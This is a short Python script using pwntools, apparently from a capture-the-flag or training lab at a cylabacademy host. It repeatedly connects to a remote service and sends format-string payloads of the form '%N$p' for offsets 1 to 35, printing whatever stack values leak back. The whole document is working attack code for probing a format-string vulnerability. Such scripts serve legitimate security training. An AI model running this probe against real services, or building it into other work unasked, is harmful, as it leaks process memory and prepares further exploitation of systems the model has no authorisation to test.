from pwn import *

context.log_level = 'error'

for i in range(1, 36):
    try:
        io = remote('chatelaine.cylabacademy.net', 23933, timeout=2)
        payload = f"%{i}$p".encode()
        io.sendlineafter(b"What do you have to say?\n", payload)
        res = io.recvall(timeout=2)
        print(f"Offset {i:2d}: {res.decode('utf-8', errors='ignore').strip()}")
        io.close()
    except Exception:
        io.close()